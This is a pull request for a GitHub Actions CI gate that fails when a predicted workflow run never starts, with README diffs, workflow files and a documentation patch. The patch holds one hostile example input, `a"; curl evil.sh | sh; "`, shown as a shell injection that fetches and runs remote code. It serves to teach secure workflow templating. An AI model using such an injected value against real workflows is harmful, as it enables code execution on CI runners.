result.title: Fail fast on a predicted run GitHub never starts
result.body:
Fixes https://github.com/thekevinscott/pr-monitor/issues/92

## What

A predicted workflow run that GitHub never starts now fails the gate ~60s after
every other predicted run has finished, naming the workflow. Before, the monitor
polled until the consumer job's external `timeout-minutes` killed it — in the
case that prompted the issue, 10m37s of polling with nothing left that could
change the verdict.

The verdict is decidable exactly when no predicted run is still in progress and
one has never registered. Nothing observed later can settle it, so the gate
stops there instead of waiting on the clock.

## Grace period: 60s, and why that is enough

Numbers from the affected run
(https://github.com/thekevinscott/lamp-the-djinn/issues/113, head `49733eb`):

| Run | created | updated | conclusion |
|---|---|---|---|
| Lint Dockerfile | 01:23:22 | 01:23:33 | success |
| Lint Python | 01:23:22 | 01:23:34 | success |
| Lint Shell | 01:23:22 | 01:23:37 | success |
| Test CLI | 01:23:22 | 01:23:35 | success |
| Test Container | 01:23:22 | 01:25:37 | success |
| Testing Conventions | 01:23:22 | 01:33:19 | success |
| PR Monitor | 01:23:22 | 01:43:56 | cancelled (external timeout) |

GitHub created every run matching the event in the same second, and
`run_started_at` equalled `created_at` for all of them. Runs do not trickle in;
the variance is in how long they take to *finish* (11s to 9m57s), not in how
long they take to become visible. So the grace is not protecting against a slow
start — it is protecting against GitHub being briefly inconsistent about a run
it already created. The absent workflow was absent for the entire window, every
time, going back nine months.

The grace is keyed off "every other predicted run is terminal", not off
PR-open time, since that is the condition that makes the verdict decidable.
A run going in progress restarts it.

## Not building the escape hatch

The issue's second half floats an input downgrading a never-started run from
fatal to a warning. Deliberately not here.

The root cause in lamp-the-djinn turned out to be real
(https://github.com/thekevinscott/lamp-the-djinn/issues/117): `docker-publish.yml`'s
server-side workflow record was in a bad state — healthy file, byte-identical
trigger block to a workflow that fires fine on the same commits, but GitHub
delivered no `push` or `pull_request` events to it for nine months. Renaming the
file forced a fresh record and it fired on `pull_request` immediately. An escape
hatch would have let a nine-month-dead publish lane be marked "warning" and
moved past, with the cage image silently never rebuilding from a PR. What fixed
it was the gate going red and staying red until someone looked.

That is a separate concern anyway, and it can be filed if a case for it shows up
that is not a repo defect.

## Changes

- `src/checks/isStalled.ts` — the decidable shape: a predicted run missing with
  nothing still in progress
- `src/messages/formatNeverStarted.ts` — the failure message, naming the
  workflows and pointing at the two things it can mean
- `src/monitor.ts` — counts consecutive stalled polls, fails once the stall has
  outlived the grace
- Test harness now caps poll count, so a gate that never settles fails instead
  of spinning
- README: the new red condition, and the `timeout-minutes` and "over-prediction
  hangs" notes that this makes false

## Not done

- Reconciliation does not run on a stall. It re-predicts only when a source ref
  moved, and re-predicting executes jobs, so wiring it into the stall path is a
  bigger change than this fix. Called out in the README limitation.
- `README.md` step 4 says the monitor polls "every 5 seconds"; it has been 30s
  since https://github.com/thekevinscott/pr-monitor/pull/61. Left alone — an
  unrelated doc repair belongs in its own PR.

@@ -12,6 +12,7 @@ It no longer guesses. [willfire](https://github.com/thekevinscott/willfire) eval
 
 - Stay yellow until every predicted run exists and has finished
 - Go red if a predicted run finishes badly
+- Go red if a predicted run never starts — GitHub created no run for it, so nothing observed later can settle the verdict
 - Go red if a predicted check name never reports — a renamed job, a deleted one, or a matrix that stopped expanding to a combination
 - Go red if a check name reports that nothing predicted — the prediction and reality disagree, so the gate cannot vouch for the check set
 
@@ -53,7 +54,7 @@ Keep this in its own workflow with no other jobs — the action excludes its own
 
 **`permissions`** — if you set an explicit block, it needs all three of `actions: read`, `contents: read`, and `pull-requests: read`. The last one is new: willfire reads the PR and its changed files.
 
-**`timeout-minutes`** — the action has no timeout of its own. This is the backstop. If a predicted run never dispatches, the gate waits until the job is killed.
+**`timeout-minutes`** — the action has no timeout of its own. This is the backstop for a run that is slow, not for one that never starts. A predicted run GitHub never creates goes red about a minute after the last other predicted run finishes, so this only catches a lane that genuinely runs long.
 
 ## Inputs
 
@@ -113,8 +114,9 @@ The map is keyed by `owner/repo/.github/workflows/file.yml:job-id` — repo-qual
 5. Logs the commits the prediction was read from — the PR head, and every repo a `uses:` reached
 6. Fails immediately on a run or a check name outside the expected set
 7. Waits while a predicted run is missing or unfinished — a check name has no existence before the run that creates its job
-8. Fails on a predicted check name that never reported once every run has finished
-9. Passes when every run concluded `success`, `skipped`, `neutral`, or `stale`; fails otherwise
+8. Fails on a predicted run that never started, once every other predicted run has finished and 60 seconds have passed
+9. Fails on a predicted check name that never reported once every run has finished
+10. Passes when every run concluded `success`, `skipped`, `neutral`, or `stale`; fails otherwise
 
 A `[skip ci]` commit predicts nothing, so nothing is required and the gate passes.
 
@@ -126,6 +128,10 @@ Runs still drive the waiting and the pass/fail conclusion. A run stays non-termi
 
 **Unresolvable check names.** A matrix computed at runtime from another job's output cannot be expanded statically, so willfire returns the job with no name. The gate fails and names it. That is deliberate: with a hole in the predicted set, a name that never reported is indistinguishable from a leg that was never predicted, and an extra name from a leg that was — so the gate cannot honour its contract. Nothing observed later settles it, so it fails up front rather than exempting the workflow and hiding real divergence inside it. In practice this arises when willfire's sandbox cannot run the job that computes the matrix — the execution failed, or the job needs something the sandbox denies.
 
+**A run that never starts.** GitHub creates every run an event matches in the same second — `run_started_at` equals `created_at`, and the variance between lanes is in how long they take to finish, not in how long they take to appear. So a predicted run still absent once every other predicted run has finished is not late. The gate waits 60 seconds past that point for the API to stop disagreeing with itself about a run it already created, then goes red naming the workflow. Another run going in progress restarts that clock.
+
+Waiting longer buys nothing: no run exists, so no check name from it can ever report. The verdict is ambiguous in one direction — it can mean the repo's workflow is not receiving the events its triggers ask for, or it can mean the prediction should not have expected it to dispatch — and both are a defect worth a human look, which is why there is no input to downgrade it to a warning.
+
 **A callee tag that moved.** A `uses:` naming a moving tag — `owner/repo/.github/workflows/x.yml@v0` — can resolve to one commit when GitHub schedules the run and another when the gate predicts. The observed checks then come from one program and the predicted checks from another, with nothing wrong on either side.
 
 So the gate records which commits each prediction was read from, and on divergence re-resolves those refs **once**. If any moved, it predicts again at the new commits and judges the same observation against the fresh expectation; the move is named in the log. If nothing moved, the divergence is real and stands — and no second prediction runs, so jobs are never executed twice to confirm a tag that held still. A move that still does not explain the observation is red, and so is a ref that stopped resolving: the gate will not vouch for a check set whose commits it cannot name.
@@ -135,7 +141,7 @@ So the gate records which commits each prediction was read from, and on divergen
 - **Workflows willfire does not model.** `workflow_run` chains and `pull_request_target` are not predicted, so their runs read as unexpected. If you use them, this gate is not for you yet.
 - **Dynamic matrices.** A `matrix:` built from another job's output cannot be expanded ahead of time. willfire runs the job that computes it in its sandbox; when that execution fails, the gate fails naming the job.
 - **Event actions willfire does not model.** The gate hands willfire the real `pull_request` action when it is `opened`, `synchronize`, or `reopened`. Run it on any other type (`labeled`, `ready_for_review`, …) and willfire falls back to inferring the action from the PR's commit count ([willfire#2](https://github.com/thekevinscott/willfire/issues/2)), which can flip a dispatch verdict on workflows that narrow `types:`.
-- **Over-prediction hangs.** A workflow predicted to dispatch that never does leaves the gate waiting for `timeout-minutes`. Reconciliation does not help here: it runs on divergence, and waiting is not divergence.
+- **Over-prediction is red, not diagnosed.** A workflow predicted to dispatch that never does fails the gate, naming the workflow, but the gate cannot tell you which side is wrong. Reconciliation does not narrow it: that runs on divergence, and an absent run is not divergence.
 - **Reconciliation is a single attempt.** One re-resolve and at most one re-prediction per gate run. A tag that moves twice mid-flight, or moves after the reconciliation, stays red — repeating would be a search for a prediction that agrees rather than a gate on one.
 
 ## Upgrading from the check-count gate

result:
name: Promote v1 tag

on:
  workflow_run:
    # Every workflow that runs on push to `main` belongs here, or `v1` never advances.
    workflows:
      - Tests
      - Testing Conventions
    types: [completed]

permissions:
  contents: write
  actions: read

concurrency:
  group: promote-v1
  cancel-in-progress: false

jobs:
  promote:
    name: Promote v1
    if: >-
      github.event.workflow_run.event == 'push' &&
      github.event.workflow_run.head_branch == 'main'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - uses: pnpm/action-setup@v6
      - uses: actions/setup-node@v6
        with:
          node-version: '24'
          cache: pnpm
      - run: pnpm install --frozen-lockfile
      - name: Promote v1
        env:
          GITHUB_TOKEN: ${{ github.token }}
          PROMOTE_OWNER: ${{ github.repository_owner }}
          PROMOTE_REPO: ${{ github.event.repository.name }}
          PROMOTE_SHA: ${{ github.event.workflow_run.head_sha }}
          PROMOTE_TAG: v1
        run: pnpm run promote

name: PR Monitor

on:
  pull_request:
    types: [opened, synchronize, reopened]
    branches:
      - main

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

permissions:
  actions: read
  contents: read
  pull-requests: read

jobs:
  monitor:
    name: 'CI Gate'
    runs-on: ubuntu-latest
    # The action has no timeout of its own; this is the backstop.
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v5
      - uses: ./

name: Tests

on:
  pull_request:
  push:
    branches: [main]

jobs:
  typecheck:
    name: Typecheck
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - uses: pnpm/action-setup@v6
      - uses: actions/setup-node@v6
        with:
          node-version: '24'
          cache: pnpm
      - run: pnpm install --frozen-lockfile
      - run: pnpm run typecheck

  lint:
    name: Lint
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - uses: pnpm/action-setup@v6
      - uses: actions/setup-node@v6
        with:
          node-version: '24'
          cache: pnpm
      - run: pnpm install --frozen-lockfile
      - run: pnpm run lint

  test:
    name: Test (100% coverage)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - uses: pnpm/action-setup@v6
      - uses: actions/setup-node@v6
        with:
          node-version: '24'
          cache: pnpm
      - run: pnpm install --frozen-lockfile
      - run: pnpm run test:coverage

  actionlint:
    name: Actionlint
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      # Pinned release + checksum: a `uses:` on a former owner name runs whoever claims it next.
      - name: Install actionlint
        env:
          VERSION: 1.7.12
          SHA256: 8aca8db96f1b94770f1b0d72b6dddcb1ebb8123cb3712530b08cc387b349a3d8
        run: |
          curl -fsSL -o "$RUNNER_TEMP/actionlint.tar.gz" "https://github.com/rhysd/actionlint/releases/download/v$VERSION/actionlint_${VERSION}_linux_amd64.tar.gz"
          echo "$SHA256  $RUNNER_TEMP/actionlint.tar.gz" | sha256sum -c -
          tar -xzf "$RUNNER_TEMP/actionlint.tar.gz" -C "$RUNNER_TEMP" actionlint
      - name: Lint workflows
        run: |
          "$RUNNER_TEMP/actionlint" -color

name: Testing Conventions

on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  conventions:
    uses: thekevinscott/testing-conventions/.github/workflows/testing-conventions.yml@v0
    with:
      languages: '["typescript"]'
      source: src
      config: testing-conventions.toml

parent c924613b5f2bbceec1a246f37cca33b04008ec16

files.patch:
@@ -283,9 +283,28 @@ Two reasons this is a requirement, not a preference:
   extracting to a script sidesteps the whole class (#301, #302).
 
 Follow the `internals/move-major-tag` (`src/move_major_tag.py` + colocated unit test + `tests/`)
-and `check_e2e_verify_wired` precedents for structure. Passing a value from a step to a script is
-a CLI argument (`… check.py "${{ steps.detect.outputs.package_root }}"`), never an env
-side-channel — see **Never pass data through the environment**.
+and `check_e2e_verify_wired` precedents for structure.
+
+**A value a step hands a script arrives as a CLI argument, never read from the environment by the
+script itself.** Never inline `${{ }}` into the invocation: GitHub substitutes that text before bash
+parses it, so a `workflow_dispatch` input of `a"; curl evil.sh | sh; "` executes. Bind the
+expression to a step `env:` name, then pass that as a quoted shell variable in the argument list:
+
+```yaml
+env:
+  PACKAGES: ${{ inputs.packages }}
+run: pnpm run bootstrap-npm -- "$PACKAGES"
+```
+
+That `env:` name is bash's, not the script's. It exists only to carry the value across the templating
+layer, and bash expands it after parsing, as one argv element. The script reads `process.argv` /
+`sys.argv` and never `process.env` / `os.environ` for its own inputs — that read is the side-channel
+**Never pass data through the environment** forbids, and a step `env:` block is not an exemption
+from it.
+
+The exception is a variable some *other* tool reads from the environment as its own documented
+interface: `NODE_AUTH_TOKEN` for `npm publish`, `CI`, `PATH`. Those are that tool's contract, not our
+step-to-script wiring, and they stay in `env:`.
 
 ## Wiring gates are earned

name: Testing Conventions

# Reusable, consumer-facing workflow: one `uses:` call runs every check.
# See docs/reference/workflow.md for the inputs, the checks, and the `@v0` contract.

on:
  workflow_call:
    inputs:
      languages:
        description: 'Optional JSON array restricting which languages to check, e.g. ["python"]. Empty (the default) auto-detects every supported language present under `source`.'
        type: string
        default: ''
      source:
        description: 'Directory scanned recursively for sources.'
        type: string
        default: 'src'
      version:
        description: 'testing-conventions version to run, e.g. 0.1.0 (default: latest from npm).'
        type: string
        default: ''
      config:
        description: 'Optional config file to refine the checks (coverage thresholds, exemptions). If absent, every check runs with sane defaults.'
        type: string
        default: 'testing-conventions.toml'
      base:
        description: 'Base ref for the diff-scoped `--base` jobs, diffed as `<base>...HEAD`. Used by the `*-changed` jobs, which run on `pull_request` only and check out full history.'
        type: string
        default: 'origin/main'
      run_e2e:
        description: 'Force the `e2e verify` freshness gate on. It is already default-on when committed receipts (`e2e-attestations/`) are present at the package root; set this to run it regardless. Needs the receipts and full git history.'
        type: boolean
        default: false
      packaging_artifact:
        description: 'Name of an uploaded build artifact (actions/upload-artifact) holding the built distributions (.whl/.tar.gz/.tgz/.crate) to check. When set, the packaging job downloads and inspects it. When empty (default), packaging still runs over a conventional dist/ found in the checkout, and is skipped only when no dist/ exists either.'
        type: string
        default: ''
      gates:
        description: 'Optional JSON array naming which gates run, e.g. ["colocated-test", "unit-lint", "integration-lint"]. Empty (the default) runs every applicable gate. Gate names: colocated-test, one-function-per-file, unit-lint, unit-coverage, mutation, integration-lint, packaging, e2e-verify, changelog. A named gate still applies its own conditions, and its diff-scoped variant rides with it (colocated-test covers the co-change job, unit-coverage the changed-line job). The allowlist is authoritative: a gate left out is skipped even when run_e2e / packaging_artifact is set.'
        type: string
        default: ''
      rust_toolchain:
        description: 'Manual override: provision a stable Rust toolchain (with a cargo registry + target cache) in the suite-executing jobs, before build_command runs. unit coverage / changed-line coverage / unit mutation already auto-provision it when the manifest at the derived package root declares a Rust-compiling build (a Cargo.toml, a maturin backend, a napi key); set this by hand only for a build the manifest does not express. The rust matrix arm always carries its own toolchain. false (the default) leaves provisioning to that auto-derivation.'
        type: boolean
        default: false

permissions:
  contents: read

jobs:
  detect:
    name: Detect requested languages with sources
    runs-on: ubuntu-latest
    outputs:
      languages: ${{ steps.scan_hermetic.outputs.languages || steps.scan_published.outputs.languages }}
      colocated_test_languages: ${{ steps.scan_hermetic.outputs.colocated_test_languages || steps.scan_published.outputs.colocated_test_languages }}
      integration_lint_languages: ${{ steps.scan_hermetic.outputs.integration_lint_languages || steps.scan_published.outputs.integration_lint_languages }}
      isolation_languages: ${{ steps.scan_hermetic.outputs.isolation_languages || steps.scan_published.outputs.isolation_languages }}
      static_languages: ${{ steps.scan_hermetic.outputs.static_languages || steps.scan_published.outputs.static_languages }}
      one_function_languages: ${{ steps.scan_hermetic.outputs.one_function_languages || steps.scan_published.outputs.one_function_languages }}
      coverage_languages: ${{ steps.scan_hermetic.outputs.coverage_languages || steps.scan_published.outputs.coverage_languages }}
      mutation_languages: ${{ steps.scan_hermetic.outputs.mutation_languages || steps.scan_published.outputs.mutation_languages }}
      packaging_dist: ${{ steps.scan_hermetic.outputs.packaging_dist || steps.scan_published.outputs.packaging_dist }}
      e2e_attestation: ${{ steps.scan_hermetic.outputs.e2e_attestation || steps.scan_published.outputs.e2e_attestation }}
      package_root: ${{ steps.scan_hermetic.outputs.package_root || steps.scan_published.outputs.package_root }}
      ts_package_manager: ${{ steps.scan_hermetic.outputs.ts_package_manager || steps.scan_published.outputs.ts_package_manager }}
      ts_pnpm_version: ${{ steps.scan_hermetic.outputs.ts_pnpm_version || steps.scan_published.outputs.ts_pnpm_version }}
      python_env: ${{ steps.scan_hermetic.outputs.python_env || steps.scan_published.outputs.python_env }}
      provision_rust: ${{ steps.scan_hermetic.outputs.provision_rust || steps.scan_published.outputs.provision_rust }}
      cargo_target_dir: ${{ steps.scan_hermetic.outputs.cargo_target_dir || steps.scan_published.outputs.cargo_target_dir }}
      config: ${{ steps.scan_hermetic.outputs.config || steps.scan_published.outputs.config }}
      build_command: ${{ steps.scan_hermetic.outputs.build_command || steps.scan_published.outputs.build_command }}
      packaging_build: ${{ steps.scan_hermetic.outputs.packaging_build || steps.scan_published.outputs.packaging_build }}
      packaging_language: ${{ steps.scan_hermetic.outputs.packaging_language || steps.scan_published.outputs.packaging_language }}
      e2e_extra_scope: ${{ steps.scan_hermetic.outputs.e2e_extra_scope || steps.scan_published.outputs.e2e_extra_scope }}
      e2e_exclude: ${{ steps.scan_hermetic.outputs.e2e_exclude || steps.scan_published.outputs.e2e_exclude }}
      cli_command: ${{ steps.scan_hermetic.outputs.cli_command || steps.scan_published.outputs.cli_command }}
      ts_mutation_adapter_args: ${{ steps.scan_hermetic.outputs.ts_mutation_adapter_args || steps.scan_published.outputs.ts_mutation_adapter_args }}
    steps:
      - uses: actions/checkout@v6
      - id: scan_hermetic
        # `uses:` cannot be dynamic, so the HEAD and published detect actions are separate steps.
        if: ${{ github.repository == 'thekevinscott/testing-conventions' && inputs.version == '' }}
        uses: ./.github/actions/detect
        with:
          languages: ${{ inputs.languages }}
          path: ${{ inputs.source }}
          config: ${{ inputs.config }}
          caller_repository: ${{ github.repository }}
          version: ${{ inputs.version }}
      - id: scan_published
        if: ${{ !(github.repository == 'thekevinscott/testing-conventions' && inputs.version == '') }}
        uses: thekevinscott/testing-conventions/.github/actions/detect@v0
        with:
          languages: ${{ inputs.languages }}
          path: ${{ inputs.source }}
          config: ${{ inputs.config }}
          caller_repository: ${{ github.repository }}
          version: ${{ inputs.version }}

  changelog:
    name: CHANGELOG + MIGRATIONS touched
    needs: detect
    if: ${{ github.event_name == 'pull_request' && (inputs.gates == '' || contains(inputs.gates, '"changelog"')) }}
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
        with:
          fetch-depth: 0
      - uses: actions/setup-node@v6
        with:
          node-version: 24
      - name: Download the CLI built from HEAD (hermetic)
        if: needs.detect.outputs.cli_command != ''
        uses: ./.github/actions/download-hermetic-cli
      - name: Check changelog and migration fragments
        env:
          BASE: ${{ inputs.base }}
          VERSION: ${{ inputs.version }}
          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}
        run: ${CLI_COMMAND:-npm --prefix "$RUNNER_TEMP" exec --yes -- "testing-conventions${VERSION:+@$VERSION}"} changelog --base "$BASE"

  static:
    name: Static checks (${{ matrix.language }})
    needs: detect
    if: ${{ (inputs.gates == '' || contains(inputs.gates, '"colocated-test"') || contains(inputs.gates, '"unit-lint"') || contains(inputs.gates, '"one-function-per-file"') || contains(inputs.gates, '"integration-lint"')) && (needs.detect.outputs.static_languages || needs.detect.outputs.integration_lint_languages) != '[]' }}
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        language: ${{ fromJSON(needs.detect.outputs.static_languages || needs.detect.outputs.integration_lint_languages) }}
    steps:
      - uses: actions/checkout@v6
        with:
          # The fetch-depth values are quoted: a bare 0 is falsy, so `&& 0 || 1` would always yield 1.
          fetch-depth: ${{ github.event_name == 'pull_request' && '0' || '1' }}
      - uses: actions/setup-node@v6
        with:
          node-version: 24
      - name: Download the CLI built from HEAD (hermetic)
        if: needs.detect.outputs.cli_command != ''
        uses: ./.github/actions/download-hermetic-cli
      - name: Check colocated test
        if: ${{ (inputs.gates == '' || contains(inputs.gates, '"colocated-test"')) && contains(needs.detect.outputs.colocated_test_languages || needs.detect.outputs.languages, format('"{0}"', matrix.language)) }}
        env:
          LANGUAGE: ${{ matrix.language }}
          SCAN_PATH: ${{ inputs.source }}
          VERSION: ${{ inputs.version }}
          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}
          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}
        run: ${CLI_COMMAND:-npm --prefix "$RUNNER_TEMP" exec --yes -- "testing-conventions${VERSION:+@$VERSION}"} unit colocated-test --language "$LANGUAGE" --config "$CONFIG" "$SCAN_PATH"
      - name: Check co-change vs ${{ inputs.base }}
        # `!cancelled()`: an earlier gate's failure must not hide this gate's result.
        if: ${{ !cancelled() && github.event_name == 'pull_request' && (inputs.gates == '' || contains(inputs.gates, '"colocated-test"')) && contains(needs.detect.outputs.languages, format('"{0}"', matrix.language)) }}
        env:
          LANGUAGE: ${{ matrix.language }}
          SCAN_PATH: ${{ inputs.source }}
          VERSION: ${{ inputs.version }}
          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}
          BASE: ${{ inputs.base }}
          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}
        run: ${CLI_COMMAND:-npm --prefix "$RUNNER_TEMP" exec --yes -- "testing-conventions${VERSION:+@$VERSION}"} unit colocated-test --language "$LANGUAGE" --base "$BASE" --config "$CONFIG" "$SCAN_PATH"
      - name: Check unit lint
        if: ${{ !cancelled() && (inputs.gates == '' || contains(inputs.gates, '"unit-lint"')) && contains(needs.detect.outputs.isolation_languages, format('"{0}"', matrix.language)) }}
        env:
          LANGUAGE: ${{ matrix.language }}
          SCAN_PATH: ${{ inputs.source }}
          VERSION: ${{ inputs.version }}
          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}
          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}
        run: ${CLI_COMMAND:-npm --prefix "$RUNNER_TEMP" exec --yes -- "testing-conventions${VERSION:+@$VERSION}"} unit lint --language "$LANGUAGE" --config "$CONFIG" "$SCAN_PATH"
      - name: Check one function per file
        # The `|| integration_lint_languages` fallback covers a stale `@v0` detect that predates
        # `one_function_languages`; the two sets are identical.
        if: ${{ !cancelled() && (inputs.gates == '' || contains(inputs.gates, '"one-function-per-file"')) && contains(needs.detect.outputs.one_function_languages || needs.detect.outputs.integration_lint_languages, format('"{0}"', matrix.language)) }}
        env:
          LANGUAGE: ${{ matrix.language }}
          SCAN_PATH: ${{ inputs.source }}
          VERSION: ${{ inputs.version }}
          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}
          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}
        run: ${CLI_COMMAND:-npm --prefix "$RUNNER_TEMP" exec --yes -- "testing-conventions${VERSION:+@$VERSION}"} unit one-function-per-file --language "$LANGUAGE" --config "$CONFIG" "$SCAN_PATH"
      - name: Lint integration tests
        if: ${{ !cancelled() && (inputs.gates == '' || contains(inputs.gates, '"integration-lint"')) && contains(needs.detect.outputs.integration_lint_languages, format('"{0}"', matrix.language)) }}
        env:
          LANGUAGE: ${{ matrix.language }}
          SCAN_PATH: ${{ inputs.source }}
          VERSION: ${{ inputs.version }}
          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}
          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}
        run: ${CLI_COMMAND:-npm --prefix "$RUNNER_TEMP" exec --yes -- "testing-conventions${VERSION:+@$VERSION}"} integration lint --language "$LANGUAGE" --config "$CONFIG" "$SCAN_PATH"

  unit-coverage:
    name: Unit-test coverage (${{ matrix.language }})
    needs: detect
    if: ${{ (inputs.gates == '' || contains(inputs.gates, '"unit-coverage"')) && needs.detect.outputs.coverage_languages != '[]' }}
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        language: ${{ fromJSON(needs.detect.outputs.coverage_languages) }}
    steps:
      - uses: actions/checkout@v6
      - name: Download the CLI built from HEAD (hermetic)
        if: needs.detect.outputs.cli_command != ''
        uses: ./.github/actions/download-hermetic-cli
      # cargo must be on PATH first: `uv sync` or an npm `prepare` may itself compile a Rust core.
      - if: matrix.language == 'rust'
        uses: dtolnay/rust-toolchain@stable
        with:
          components: llvm-tools-preview
      - if: matrix.language == 'rust'
        name: Install cargo-llvm-cov
        uses: taiki-e/install-action@v2
        with:
          tool: cargo-llvm-cov
      - if: (inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true') && matrix.language != 'rust'
        uses: dtolnay/rust-toolchain@stable
      - if: inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true'
        name: Cache the Rust build (cargo registry + target)
        uses: actions/cache@v4
        with:
          path: |
            ~/.cargo/registry
            ~/.cargo/git
            ${{ needs.detect.outputs.cargo_target_dir || format('{0}/target', needs.detect.outputs.package_root) }}
          key: rust-toolchain-build-${{ runner.os }}-${{ hashFiles('**/Cargo.lock') }}
          restore-keys: |
            rust-toolchain-build-${{ runner.os }}-
      - if: matrix.language == 'python'
        uses: astral-sh/setup-uv@v7
        with:
          enable-cache: true
      - if: matrix.language == 'python'
        name: Provision the Python suite environment (uv)
        working-directory: ${{ needs.detect.outputs.package_root }}
        env:
          PYTHON_ENV: ${{ needs.detect.outputs.python_env || 'pip' }}
        run: |
          set -euo pipefail
          if [ "$PYTHON_ENV" = "uv" ]; then uv sync; else uv venv; fi
          if compgen -G "$GITHUB_WORKSPACE/hermetic-cli/*.whl" > /dev/null; then uv pip install pytest "$GITHUB_WORKSPACE"/hermetic-cli/*.whl; else uv pip install pytest testing-conventions; fi
          echo "$PWD/.venv/bin" >> "$GITHUB_PATH"
      - if: matrix.language == 'typescript' && (needs.detect.outputs.ts_package_manager || 'pnpm') == 'pnpm'
        uses: pnpm/action-setup@v5
        with:
          version: ${{ needs.detect.outputs.ts_pnpm_version || '>=11' }}
      - uses: actions/setup-node@v6
        with:
          node-version: 24
      - if: matrix.language == 'typescript'
        name: Install project dependencies
        working-directory: ${{ needs.detect.outputs.package_root }}
        env:
          PM: ${{ needs.detect.outputs.ts_package_manager || 'pnpm' }}
        run: |
          set -euo pipefail
          if [ "$PM" = "pnpm" ]; then pnpm install --frozen-lockfile; else npm ci; fi
      # The command is passed through env and `eval`-ed, so a full shell string works and no
      # caller value is interpolated into `run:`.
      - if: needs.detect.outputs.build_command != ''
        name: Run the build step (build_command)
        working-directory: ${{ needs.detect.outputs.package_root }}
        env:
          BUILD_COMMAND: ${{ needs.detect.outputs.build_command }}
        run: |
          set -euo pipefail
          eval "$BUILD_COMMAND"
      - name: Check unit-test coverage
        env:
          LANGUAGE: ${{ matrix.language }}
          SCAN_PATH: ${{ inputs.source }}
          VERSION: ${{ inputs.version }}
          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}
          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}
        run: ${CLI_COMMAND:-npm --prefix "$RUNNER_TEMP" exec --yes -- "testing-conventions${VERSION:+@$VERSION}"} unit coverage --language "$LANGUAGE" --config "$CONFIG" "$SCAN_PATH"

  coverage-changed:
    name: Unit-test coverage — changed lines (${{ matrix.language }})
    needs: detect
    if: ${{ github.event_name == 'pull_request' && (inputs.gates == '' || contains(inputs.gates, '"unit-coverage"')) && needs.detect.outputs.coverage_languages != '[]' }}
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        language: ${{ fromJSON(needs.detect.outputs.coverage_languages) }}
    steps:
      - uses: actions/checkout@v6
        with:
          # `--base` diffs `<base>...HEAD`, so the base ref must be reachable.
          fetch-depth: 0
      - name: Download the CLI built from HEAD (hermetic)
        if: needs.detect.outputs.cli_command != ''
        uses: ./.github/actions/download-hermetic-cli
      # cargo must be on PATH first: `uv sync` or an npm `prepare` may itself compile a Rust core.
      - if: matrix.language == 'rust'
        uses: dtolnay/rust-toolchain@stable
        with:
          components: llvm-tools-preview
      - if: matrix.language == 'rust'
        name: Install cargo-llvm-cov
        uses: taiki-e/install-action@v2
        with:
          tool: cargo-llvm-cov
      - if: (inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true') && matrix.language != 'rust'
        uses: dtolnay/rust-toolchain@stable
      - if: inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true'
        name: Cache the Rust build (cargo registry + target)
        uses: actions/cache@v4
        with:
          path: |
            ~/.cargo/registry
            ~/.cargo/git
            ${{ needs.detect.outputs.cargo_target_dir || format('{0}/target', needs.detect.outputs.package_root) }}
          key: rust-toolchain-build-${{ runner.os }}-${{ hashFiles('**/Cargo.lock') }}
          restore-keys: |
            rust-toolchain-build-${{ runner.os }}-
      - if: matrix.language == 'python'
        uses: astral-sh/setup-uv@v7
        with:
          enable-cache: true
      - if: matrix.language == 'python'
        name: Provision the Python suite environment (uv)
        working-directory: ${{ needs.detect.outputs.package_root }}
        env:
          PYTHON_ENV: ${{ needs.detect.outputs.python_env || 'pip' }}
        run: |
          set -euo pipefail
          if [ "$PYTHON_ENV" = "uv" ]; then uv sync; else uv venv; fi
          if compgen -G "$GITHUB_WORKSPACE/hermetic-cli/*.whl" > /dev/null; then uv pip install pytest "$GITHUB_WORKSPACE"/hermetic-cli/*.whl; else uv pip install pytest testing-conventions; fi
          echo "$PWD/.venv/bin" >> "$GITHUB_PATH"
      - if: matrix.language == 'typescript' && (needs.detect.outputs.ts_package_manager || 'pnpm') == 'pnpm'
        uses: pnpm/action-setup@v5
        with:
          version: ${{ needs.detect.outputs.ts_pnpm_version || '>=11' }}
      - uses: actions/setup-node@v6
        with:
          node-version: 24
      - if: matrix.language == 'typescript'
        name: Install project dependencies
        working-directory: ${{ needs.detect.outputs.package_root }}
        env:
          PM: ${{ needs.detect.outputs.ts_package_manager || 'pnpm' }}
        run: |
          set -euo pipefail
          if [ "$PM" = "pnpm" ]; then pnpm install --frozen-lockfile; else npm ci; fi
      - if: needs.detect.outputs.build_command != ''
        name: Run the build step (build_command)
        working-directory: ${{ needs.detect.outputs.package_root }}
        env:
          BUILD_COMMAND: ${{ needs.detect.outputs.build_command }}
        run: |
          set -euo pipefail
          eval "$BUILD_COMMAND"
      - name: Check changed-line coverage vs ${{ inputs.base }}
        env:
          LANGUAGE: ${{ matrix.language }}
          SCAN_PATH: ${{ inputs.source }}
          VERSION: ${{ inputs.version }}
          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}
